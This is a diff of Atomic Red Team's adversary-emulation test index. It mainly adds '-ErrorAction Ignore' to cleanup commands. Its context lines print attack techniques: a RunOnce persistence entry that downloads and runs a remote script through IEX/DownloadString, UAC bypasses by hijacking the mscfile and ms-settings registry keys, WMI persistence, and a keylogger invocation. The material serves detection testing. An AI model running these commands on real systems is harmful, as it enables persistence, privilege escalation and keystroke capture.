@@ -3791,6 +3791,7 @@ persistence:
           $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
           set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
         cleanup_command: 'Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
+          -ErrorAction Ignore
 
 '
   T1053:
@@ -5021,7 +5022,7 @@ persistence:
         cleanup_command: |
           $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
           $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
-          $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
+          $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
 
           $FilterConsumerBindingToCleanup | Remove-WmiObject
           $EventConsumerToCleanup | Remove-WmiObject
@@ -5743,6 +5744,7 @@ defense-evasion:
           Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\eventvwr.msc"
         cleanup_command: 'Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse
+          -ErrorAction Ignore
 
 '
     - name: Bypass UAC using Fodhelper
@@ -5812,7 +5814,7 @@ defense-evasion:
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\ComputerDefaults.exe"
         cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
-          -Recurse
+          -Recurse -ErrorAction Ignore
 
 '
     - name: Bypass UAC by Mocking Trusted Directories
@@ -13157,6 +13159,7 @@ privilege-escalation:
           Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\eventvwr.msc"
         cleanup_command: 'Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse
+          -ErrorAction Ignore
 
 '
     - name: Bypass UAC using Fodhelper
@@ -13226,7 +13229,7 @@ privilege-escalation:
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\ComputerDefaults.exe"
         cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
-          -Recurse
+          -Recurse -ErrorAction Ignore
 
 '
     - name: Bypass UAC by Mocking Trusted Directories
@@ -20181,7 +20184,7 @@ credential-access:
         command: |
           Set-Location $PathToAtomicsFolder
           .\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
-        cleanup_command: 'Remove-Item $env:TEMP\key.log
+        cleanup_command: 'Remove-Item $env:TEMP\key.log -ErrorAction Ignore
 
 '
   T1141:
@@ -22185,7 +22188,7 @@ execution:
           Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
           $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
           Invoke-Expression $streamcommand
-        cleanup_command: 'Remove:Item #{ads_file}
+        cleanup_command: 'Remove-Item #{ads_file} -Force -ErrorAction Ignore
 
 '
   T1121:
@@ -25917,7 +25920,8 @@ collection:
           -DestinationPath $env:TEMP\Folder_to_zip.zip
 
 '
-        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_zip.zip
+        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_zip.zip -ErrorAction
+          Ignore
 
 '
   '':
@@ -26215,7 +26219,7 @@ collection:
         command: |
           Set-Location $PathToAtomicsFolder
           .\T1056\src\Get-Keystrokes.ps1 -LogPath #{filepath}
-        cleanup_command: 'Remove-Item $env:TEMP\key.log
+        cleanup_command: 'Remove-Item $env:TEMP\key.log -ErrorAction Ignore
 
 '
   T1113:
